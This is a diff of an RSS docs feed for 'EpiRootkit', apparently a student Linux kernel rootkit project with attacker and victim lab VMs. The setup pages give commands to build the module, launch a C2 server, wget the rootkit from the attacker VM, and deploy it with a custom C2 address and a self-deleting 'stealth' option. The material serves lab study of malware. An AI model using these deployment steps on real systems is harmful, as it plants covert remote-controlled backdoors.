@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 05 Jun 2025 16:36:26 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 20:03:36 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -13,10 +13,7 @@
  
 &lt;h2 id="nom-de-léquipe">Nom de l&amp;rsquo;équipe &lt;a href="#nom-de-l%c3%a9quipe" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Nous sommes Tux Fan Club 🐧&lt;/p>
 &lt;p>C&amp;rsquo;est Léa qui a choisi le nom car c&amp;rsquo;est la seule personne du groupe un peu créative 👀&lt;/p>
-&lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p></description></item><item><title>Host Environment Setup</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h1 id="host-environment-setup">Host Environment Setup &lt;a href="#host-environment-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>Purpose:&lt;/strong> Configure Ubuntu 24.10 host to run attacker and victim VMs. The actual EpiRootkit components run INSIDE the VMs.&lt;/p>
-&lt;/blockquote>
-&lt;h2 id="setup-method">Setup Method &lt;a href="#setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p></description></item><item><title>Host Environment Setup</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h2 id="setup-method">Setup Method &lt;a href="#setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 &lt;nav>
 	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
 
@@ -28,14 +25,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="acfdebTab" data-bs-toggle="tab" data-bs-target="#acfdeb"
-		 type="button" role="tab" aria-controls="acfdeb" aria-selected="true">Automated Setup (Recommended)&lt;/a>
+		 id="efacbdTab" data-bs-toggle="tab" data-bs-target="#efacbd"
+		 type="button" role="tab" aria-controls="efacbd" aria-selected="true">Automated (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="bfcaedTab" data-bs-toggle="tab" data-bs-target="#bfcaed"
-		 type="button" role="tab" aria-controls="bfcaed" aria-selected="true">Manual Step-by-Step&lt;/a>
+		 id="afecbdTab" data-bs-toggle="tab" data-bs-target="#afecbd"
+		 type="button" role="tab" aria-controls="afecbd" aria-selected="true">Manual Step-by-Step&lt;/a>
 
 		
 
@@ -52,10 +49,9 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="acfdeb" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="efacbd" role="tabpanel" aria-labelledby="nav-1">
 
-	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Run the automated setup script to install all dependencies:&lt;/p>
-
+	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -74,12 +70,12 @@
  &lt;code>./scripts/install_dependencies.sh&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>What it installs:&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>Installs:&lt;/strong>&lt;/p>
 &lt;ul>
-&lt;li>&lt;strong>QEMU/KVM&lt;/strong>: Virtual machine hypervisor&lt;/li>
-&lt;li>&lt;strong>libvirt&lt;/strong>: VM management daemon and tools&lt;/li>
-&lt;li>&lt;strong>Bridge utils&lt;/strong>: Network bridge configuration&lt;/li>
-&lt;li>&lt;strong>User permissions&lt;/strong>: Adds you to libvirt group&lt;/li>
+&lt;li>QEMU/KVM: Virtual machine hypervisor&lt;/li>
+&lt;li>libvirt: VM management daemon and tools&lt;/li>
+&lt;li>Bridge utils: Network bridge configuration&lt;/li>
+&lt;li>User permissions: Adds you to libvirt group&lt;/li>
 &lt;/ul>
 
 
@@ -91,9 +87,9 @@
 
 
 
-&lt;div class="tab-pane fade" id="bfcaed" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="afecbd" role="tabpanel" aria-labelledby="nav-1">
 
-	&lt;h3 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+	&lt;h3 id="install-dependencies">Install Dependencies &lt;a href="#install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -108,11 +104,12 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="0e626b2" class="language-bash ">
- &lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y&lt;/code>
+ &lt;pre id="7e3bdd3" class="language-bash ">
+ &lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y
+sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="2-install-vm-management-tools">2. Install VM Management Tools &lt;a href="#2-install-vm-management-tools" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="configure-libvirt">Configure Libvirt &lt;a href="#configure-libvirt" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -127,37 +124,13 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="9f50dab" class="language-bash ">
- &lt;code>sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="3-configure-libvirt">3. Configure Libvirt &lt;a href="#3-configure-libvirt" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="d6a02f1" class="language-bash ">
- &lt;code># Enable and start libvirt daemon
-sudo systemctl enable --now libvirtd
-
-# Add current user to libvirt group
+ &lt;pre id="89a045c" class="language-bash ">
+ &lt;code>sudo systemctl enable --now libvirtd
 sudo usermod -aG libvirt $USER
-
-# Activate group membership (required before using VMs)
 newgrp libvirt&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="4-optional-documentation-tools">4. Optional: Documentation Tools &lt;a href="#4-optional-documentation-tools" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="optional-documentation-tools">Optional: Documentation Tools &lt;a href="#optional-documentation-tools" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -172,7 +145,7 @@ newgrp libvirt&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="960483f" class="language-bash ">
+ &lt;pre id="2aea3ca" class="language-bash ">
  &lt;code># Only if you want to build docs locally
 sudo apt install -y hugo&lt;/code>
  &lt;/pre>
@@ -184,59 +157,50 @@ sudo apt install -y hugo&lt;/code>
 
 
 &lt;/div>
-&lt;h2 id="verification">Verification &lt;a href="#verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>After completing either setup method, verify your installation:&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;h1 id="virtual-machine-installation--verification">Virtual Machine Installation &amp;amp; Verification &lt;a href="#virtual-machine-installation--verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>You must have completed &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Host Environment Setup&lt;/strong>&lt;br>Prepare your host system for running EpiRootkit VMs&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Initial Setup &amp;amp; Installation&lt;/a> before proceeding.&lt;/strong>&lt;/p>
+&lt;h2 id="verification">Verification &lt;a href="#verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="a4d6f43" class="language-bash ">
+ &lt;code># Check VM tools
+virsh list --all
+qemu-system-x86_64 --version
+
+# Verify KVM support
+lsmod | grep kvm
+egrep -c &amp;#39;(vmx|svm)&amp;#39; /proc/cpuinfo # Should be &amp;gt;= 1
+ls -la /dev/kvm # Should be accessible&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="next-steps">Next Steps &lt;a href="#next-steps" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>VM Setup&lt;/strong>: &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/vm-installation/'>&lt;p>SETUP&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;blockquote>
+&lt;p>Complete &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Host Environment Setup&lt;/strong>&lt;br>Prepare your host system for running EpiRootkit VMs&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Host Environment Setup&lt;/a> before proceeding.&lt;/p>
 &lt;/blockquote>
-&lt;h2 id="1-choose-your-vm-setup-method">1. Choose Your VM Setup Method &lt;a href="#1-choose-your-vm-setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
-&lt;nav>
-	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
-
-		
-		
-		
-		
-
-		
-
-		&lt;a class="nav-link active"
-		 id="cbedfaTab" data-bs-toggle="tab" data-bs-target="#cbedfa"
-		 type="button" role="tab" aria-controls="cbedfa" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
-
-		
-
-		&lt;a class="nav-link "
-		 id="abfedcTab" data-bs-toggle="tab" data-bs-target="#abfedc"
-		 type="button" role="tab" aria-controls="abfedc" aria-selected="true">Build Disks Yourself&lt;/a>
-
-		
-
-	&lt;/div>
-&lt;/nav>
-
-&lt;div class="tab-content" id="nav-tab-content">
-
-	
-
-
-
-
-
-
-
-&lt;div class="tab-pane fade show active" id="cbedfa" role="tabpanel" aria-labelledby="nav-1">
-
-	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacker VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;h1 id="attacker-vm-setup">Attacker VM Setup &lt;a href="#attacker-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Configure the attacking VM with Node.js C2 server and React web interface.&lt;/p>
-&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>&lt;strong>Host setup complete&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;strong>VM downloaded&lt;/strong>: &lt;code>vm/attacker.qcow2&lt;/code> in project root&lt;/li>
+&lt;p>Throughout this documentation, you will see two options:&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Pre-built Disks&lt;/strong>: Ready-to-use VM images with everything pre-configured and pre-installed.&lt;/li>
+&lt;li>&lt;strong>Fresh Installation&lt;/strong>: Manual setup process to create your own VM images.&lt;/li>
+&lt;/ol>
+&lt;p>The pre-built disks were created using the exact steps described in the manual installation sections.&lt;/p>
+&lt;p>So while we recommend using the pre-built disks, you can also create your own VMs by following the manual installation steps.&lt;/p></description></item><item><title>Attacker VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Host setup&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
+&lt;li>&lt;strong>VM disk&lt;/strong>: &lt;code>attacker.qcow2&lt;/code> in &lt;code>/var/lib/libvirt/images/&lt;/code>&lt;/li>
 &lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh attacker&lt;/code>&lt;/li>
 &lt;/ol>
-&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Connection Details:&lt;/strong>&lt;/p>
-&lt;ul>
-&lt;li>&lt;strong>IP Address&lt;/strong>: 192.168.200.11 (static)&lt;/li>
-&lt;li>&lt;strong>Username&lt;/strong>: &lt;code>attacker&lt;/code>&lt;/li>
-&lt;li>&lt;strong>Password&lt;/strong>: &lt;code>jules&lt;/code>&lt;/li>
-&lt;li>&lt;strong>Auto-login&lt;/strong>: Enabled (no password prompt)&lt;/li>
+&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>IP&lt;/strong>: 192.168.200.11 (static)&lt;/li>
+&lt;li>&lt;strong>Credentials&lt;/strong>: &lt;code>attacker&lt;/code> / &lt;code>jules&lt;/code> (auto-login)&lt;/li>
 &lt;/ul>
 &lt;h2 id="setup-method">Setup Method &lt;a href="#setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 &lt;nav>
@@ -250,14 +214,14 @@ sudo apt install -y hugo&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="ecfabdTab" data-bs-toggle="tab" data-bs-target="#ecfabd"
-		 type="button" role="tab" aria-controls="ecfabd" aria-selected="true">Pre-built Disk (Recommended)&lt;/a>
+		 id="defbacTab" data-bs-toggle="tab" data-bs-target="#defbac"
+		 type="button" role="tab" aria-controls="defbac" aria-selected="true">Pre-built (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="dbfaecTab" data-bs-toggle="tab" data-bs-target="#dbfaec"
-		 type="button" role="tab" aria-controls="dbfaec" aria-selected="true">Self-build from Scratch&lt;/a>
+		 id="acfdbeTab" data-bs-toggle="tab" data-bs-target="#acfdbe"
+		 type="button" role="tab" aria-controls="acfdbe" aria-selected="true">Fresh VM Setup&lt;/a>
 
 		
 
@@ -274,21 +238,9 @@ sudo apt install -y hugo&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="ecfabd" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="defbac" role="tabpanel" aria-labelledby="nav-1">
 
-	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is already set up, so you can immediately build and run:&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;h1 id="victim-vm-setup">Victim VM Setup &lt;a href="#victim-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Deploy the EpiRootkit kernel module on the victim system.&lt;/p>
-&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>&lt;strong>Host setup complete&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;strong>VM downloaded&lt;/strong>: &lt;code>vm/victim.qcow2&lt;/code> in project root&lt;/li>
-&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>&lt;/li>
-&lt;/ol>
-&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Connection Details:&lt;/strong>&lt;/p>
-&lt;ul>
-&lt;li>&lt;strong>IP Address&lt;/strong>: 192.168.200.10 (static)&lt;/li>
-&lt;li>&lt;strong>Username&lt;/strong>: &lt;code>victim&lt;/code> / &lt;strong>Password&lt;/strong>: &lt;code>jules&lt;/code>&lt;/li>
-&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS with kernel 5.4.0&lt;/li>
-&lt;/ul>
-&lt;h2 id="deployment-process">Deployment Process &lt;a href="#deployment-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-receive-payload">1. Receive Payload &lt;a href="#1-receive-payload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Get the rootkit files from the attacker VM:&lt;/p>
+	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is pre-configured. Build and run immediately:&lt;/p>
 
 
 
@@ -304,19 +256,60 @@ sudo apt install -y hugo&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="e9a67ad" class="language-bash ">
+ &lt;pre id="38da08e" class="language-bash ">
+ &lt;code># Inside attacker VM (auto-logged in)
+cd epirootkit
+
+# Build rootkit
+cd rootkit &amp;amp;&amp;amp; make clean &amp;amp;&amp;amp; make
+ls -la epirootkit.ko # ✅ Ready
+
+# Start C2 server &amp;#43; Web UI
+cd .. &amp;amp;&amp;amp; ./deploy_c2.sh
+# ✅ C2 server: port 4444
+# ✅ Web interface: port 3000&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Access&lt;/strong>: &lt;code>http://192.168.200.11:3000&lt;/code> from host browser or &lt;code>http://localhost:3000&lt;/code> from attacker VM browser&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Host setup&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
+&lt;li>&lt;strong>VM disk&lt;/strong>: &lt;code>victim.qcow2&lt;/code> in &lt;code>/var/lib/libvirt/images/&lt;/code>&lt;/li>
+&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>IP&lt;/strong>: 192.168.200.10 (static)&lt;/li>
+&lt;li>&lt;strong>Credentials&lt;/strong>: &lt;code>victim&lt;/code> / &lt;code>jules&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS (kernel 5.4.0)&lt;/li>
+&lt;/ul>
+&lt;h2 id="deploy-rootkit">Deploy Rootkit &lt;a href="#deploy-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-get-payload">1. Get Payload &lt;a href="#1-get-payload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Receive rootkit files from attacker VM:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="074c16a" class="language-bash ">
  &lt;code># Option A: HTTP download
 wget http://192.168.200.11:8080/epirootkit.ko
 wget http://192.168.200.11:8080/deploy_rootkit.sh
 
-# Option B: SCP transfer
-# Files transferred by attacker to victim@192.168.200.10:~/
+# Option B: SCP transfer (from attacker VM)
+# First: sudo apt install -y openssh-server (inside victim VM)
+scp epirootkit.ko deploy_rootkit.sh victim@192.168.200.10:~/
 
-# Option C: Web UI upload
-# Use attacker&amp;#39;s web interface file transfer panel&lt;/code>
+# Option C: Web UI upload (In development)
+# Use attacker&amp;#39;s web interface file transfer &lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="2-deploy-rootkit">2. Deploy Rootkit &lt;a href="#2-deploy-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="2-deploy">2. Deploy &lt;a href="#2-deploy" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -331,19 +324,18 @@ wget http://192.168.200.11:8080/deploy_rootkit.sh
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="4ac9a81" class="language-bash ">
- &lt;code># Basic deployment (connects to 192.168.200.11:4444)
+ &lt;pre id="003679b" class="language-bash ">
+ &lt;code># Default deployment (connects to 192.168.200.11:4444)
 sudo ./deploy_rootkit.sh
 
 # Custom C2 server
-sudo ./deploy_rootkit.sh address=IP port=PORT
+sudo ./deploy_rootkit.sh address=IP/domain port=PORT
 
 # Stealth deployment (self-destructs)
 sudo ./deploy_rootkit.sh --self-delete&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="3-verify-connection">3. Verify Connection &lt;a href="#3-verify-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Switch to attacker VM C2 server:&lt;/p></description></item><item><title>Host to VM File Transfer</title><link>/docs/02-setup/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/02-setup/file-transfer/</guid><description>&lt;h1 id="host-to-vm-file-transfer">Host to VM File Transfer &lt;a href="#host-to-vm-file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Guide for transferring files from the host system to QEMU virtual machines.&lt;/p>
-&lt;h2 id="transfer-methods">Transfer Methods &lt;a href="#transfer-methods" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h3 id="3-verify-connection">3. Verify Connection &lt;a href="#3-verify-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Switch to attacker VM C2 server:&lt;/p></description></item><item><title>Host to VM File Transfer</title><link>/docs/02-setup/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/02-setup/file-transfer/</guid><description>&lt;h2 id="transfer-methods">Transfer Methods &lt;a href="#transfer-methods" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 &lt;nav>
 	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
 
@@ -355,26 +347,26 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="eafcdbTab" data-bs-toggle="tab" data-bs-target="#eafcdb"
-		 type="button" role="tab" aria-controls="eafcdb" aria-selected="true">Automated Script (Recommended)&lt;/a>
+		 id="cbdfeaTab" data-bs-toggle="tab" data-bs-target="#cbdfea"
+		 type="button" role="tab" aria-controls="cbdfea" aria-selected="true">Automated (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cedfabTab" data-bs-toggle="tab" data-bs-target="#cedfab"
-		 type="button" role="tab" aria-controls="cedfab" aria-selected="true">Manual SCP/SSH&lt;/a>
+		 id="eabcfdTab" data-bs-toggle="tab" data-bs-target="#eabcfd"
+		 type="button" role="tab" aria-controls="eabcfd" aria-selected="true">SSH/SCP&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cfabdeTab" data-bs-toggle="tab" data-bs-target="#cfabde"
-		 type="button" role="tab" aria-controls="cfabde" aria-selected="true">HTTP Server&lt;/a>
+		 id="adbcefTab" data-bs-toggle="tab" data-bs-target="#adbcef"
+		 type="button" role="tab" aria-controls="adbcef" aria-selected="true">HTTP Server&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="bfecdaTab" data-bs-toggle="tab" data-bs-target="#bfecda"
-		 type="button" role="tab" aria-controls="bfecda" aria-selected="true">Other Methods&lt;/a>
+		 id="fdaebcTab" data-bs-toggle="tab" data-bs-target="#fdaebc"
+		 type="button" role="tab" aria-controls="fdaebc" aria-selected="true">Shared Folders&lt;/a>
 
 		
 
@@ -391,9 +383,9 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="eafcdb" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="cbdfea" role="tabpanel" aria-labelledby="nav-1">
 
-	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup, use the automated deployment script:&lt;/p>
+	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup:&lt;/p>
 
 
 
